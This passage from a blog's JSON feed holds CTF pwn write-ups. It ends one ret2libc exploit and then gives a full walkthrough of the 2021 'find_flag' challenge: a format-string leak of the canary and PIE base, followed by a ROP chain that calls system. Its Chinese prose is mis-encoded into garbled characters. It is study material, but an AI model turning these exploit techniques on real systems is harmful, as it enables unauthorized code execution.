data-num=\"38\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>addr_system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>addr_binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>os: æ—©çŸ¥é“ libcsearcher èƒ½æ‰“é€šï¼Œè°ä¼šæ‰å¤´å‘ï¼ï¼ï¼ï¼</p>\n",
            "tags": [
                "pie",
                "gotæ”¹å†™",
                "éšæœºæ•°æ£€æŸ¥"
            ]
        },
        {
            "id": "http://example.com/2023/08/02/find-flag/",
            "url": "http://example.com/2023/08/02/find-flag/",
            "title": "find_flag",
            "date_published": "2023-08-02T10:44:10.000Z",
            "content_html": "<h1 id=\"é¢˜ç›®å¤ç°æ·±è‚²æ¯-2021find_flag\"><a class=\"markdownIt-Anchor\" href=\"#é¢˜ç›®å¤ç°æ·±è‚²æ¯-2021find_flag\">#</a> é¢˜ç›®å¤ç° â€”â€”[æ·±è‚²æ¯ 2021] find_flag</h1>\n<p>pie ä¸ canary åŒæ—¶å¼€å¯ï¼Œå¹¶ä¸”æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</p>\n<h3 id=\"æ£€æŸ¥ç¨‹åº\"><a class=\"markdownIt-Anchor\" href=\"#æ£€æŸ¥ç¨‹åº\">#</a> æ£€æŸ¥ç¨‹åºï¼š</h3>\n<p><img data-src=\"/img/find_flag/image-20230609204936112.png\" alt=\"image-20230609204936112\"></p>\n<p>ä¿æŠ¤å¾ˆå…¨é¢ã€‚</p>\n<p><img data-src=\"/img/find_flag/image-20230609205227082.png\" alt=\"image-20230609205227082\"></p>\n<p>å¯ä»¥çœ‹çš„å‡ºï¼Œåœ¨ç¬¬ä¸€å¤„æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>\n<h3 id=\"idaåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#idaåˆ†æ\">#</a> IDA åˆ†æï¼š</h3>\n<p><img data-src=\"/img/find_flag/image-20230609205448884.png\" alt=\"image-20230609205448884\"></p>\n<p>çœ‹äº†ä¸€ä¸‹ mian å‡½æ•°ï¼Œå°†å‡½æ•°é‡å‘½åï¼Œpwn æ˜¯æˆ‘ä»¬æœ‰æ¼æ´çš„åœ°æ–¹ã€‚</p>\n<p><img data-src=\"/img/find_flag/image-20230609205602697.png\" alt=\"image-20230609205602697\"></p>\n<p>å¯ä»¥çœ‹åˆ° gets å‡½æ•°å¯ä»¥è¿›è¡Œæ ˆæº¢å‡ºï¼Œä½†æ˜¯æœ‰ canary ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ³„éœ² canaryï¼Œå¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å»æ³„éœ² canary å¹¶è¦†å†™åœ¨æ ˆä¸Šã€‚</p>\n<p><img data-src=\"/img/find_flag/image-20230609205729803.png\" alt=\"image-20230609205729803\"></p>\n<p>å‘ç° backdoorã€‚ä½†æ˜¯å¼€äº† pieï¼Œæˆ‘ä»¬åº”è¯¥æ— æ³•åˆ©ç”¨åä»¬ï¼Œä½†æ˜¯å¥½åœ¨<strong>åªè¯»å˜é‡ï¼ˆconst ä¿®é¥°çš„ï¼‰å’Œå­—ç¬¦ä¸²å˜é‡</strong>æ”¾å…¥<strong> rodata</strong> åŒºã€‚è¿˜æ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚</p>\n<h3 id=\"gdbåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#gdbåˆ†æ\">#</a> gdb åˆ†æ:</h3>\n<p>æ‰“æ–­ç‚¹åœ¨ printf å¤„ï¼ˆä¸çŸ¥åˆ°ä¸ºä»€ä¹ˆä¸èƒ½åœ¨ main å‡½æ•°å¤„å¤§ä¸äº†æ–­ç‚¹ï¼Œå¾ˆå¥‡æ€ª</p>\n<p><img data-src=\"/img/find_flag/image-20230609210601700.png\" alt=\"image-20230609210601700\"></p>\n<p>ä¸€ç›´æ­¥åˆ°ä¸‹å›¾å¤„</p>\n<p><img data-src=\"/img/find_flag/image-20230609210758887.png\" alt=\"image-20230609210758887\"></p>\n<p>çœ‹æ ˆä¿¡æ¯ï¼Œå¾ˆæ˜æ˜¾èƒ½çœ‹åˆ° canaryâ€”â€”&gt;</p>\n<blockquote>\n<p>0b:0058â”‚             0x7fffffffdd18 â—‚â€” 0x121203e586d31600</p>\n</blockquote>\n<p><img data-src=\"/img/find_flag/image-20230609210832637.png\" alt=\"image-20230609210832637\"></p>\n<p>çœ‹ä¸€ä¸‹è·æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚</p>\n<p><img data-src=\"/img/find_flag/image-20230609211002101.png\" alt=\"image-20230609211002101\"></p>\n<p>ä½†æ˜¯éš¾ç‚¹ä¸æ˜¯åœ¨æ³„éœ² canaryï¼Œè€Œæ˜¯åœ¨æ³„éœ²åŸºå€ä¸Šå»ï¼Œéœ€è¦äº†è§£ pie å’Œæ ˆï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨ rbp ä¸‹é¢åˆšå¥½æœ‰ä¸€ä¸ªæˆ‘ä»¬èƒ½æ³„éœ²å‡½æ•°åŸºå€ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæ˜¯ä»–å‘¢ï¼Ÿ</p>\n<p>è€ƒè™‘å› ä¸ºè¿™ä¸ªåœ°å€ä»£è¡¨äº†æˆ‘ä»¬çš„ main å‡½æ•°ç»“å°¾çš„ä¸€ä¸ªéƒ¨åˆ†çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€è¿›è€Œè®¡ç®—å‡ºæ ˆçš„åŸºå€ã€‚</p>\n<p><img data-src=\"/img/find_flag/image-20230609211705133.png\" alt=\"image-20230609211705133\"></p>\n<p>æ¥ä¸‹æ¥å°±æ˜¯ç¡®å®šåç§»äº†ï¼ˆé¡»æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯éœ€è¦åœ¨ gets å‡½æ•°è¾“å…¥åï¼Œåœ¨æŸ¥çœ‹æ ˆçš„æƒ…å†µï¼Œè¿™æ ·æ›´å¥½ç¡®å®šã€‚</p>\n<p><img data-src=\"/img/find_flag/image-20230609211905134.png\" alt=\"image-20230609211905134\"></p>\n<h3 id=\"expæ„é€ ç¯èŠ‚\"><a class=\"markdownIt-Anchor\" href=\"#expæ„é€ ç¯èŠ‚\">#</a> exp æ„é€ ç¯èŠ‚:</h3>\n<p>æ—¢ç„¶æˆ‘ä»¬æ‰¾åˆ°äº†ï¼Œæˆ‘ä»¬å°±æ„é€  payload1 å»æ³„éœ² canary å’ŒåŸºå€</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>paylaod1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr></table></figure><p>åœ¨æ„é€  rop é“¾çš„å‡†å¤‡ã€‚</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span> <span class=\"token comment\"># robata ä¸­çš„å­—ç¬¦ä¸²</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#ROPgadget --binary file --only 'pop|ret'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr></table></figure><h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> expï¼š</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> local<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tp <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tp <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.anna.nssctf.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28068</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'you, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'---'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>base <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#ropgadget</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'else? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ç»“æœ\"><a class=\"markdownIt-Anchor\" href=\"#ç»“æœ\">#</a> ç»“æœï¼š</h3>\n<p><img data-src=\"/img/find_flag/image-20230609212855635.png\" alt=\"image-20230609212855635\"></p>\n",
            "tags": [
                "canary",
                "pie",
                "æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"
            ]
        }
    ]
}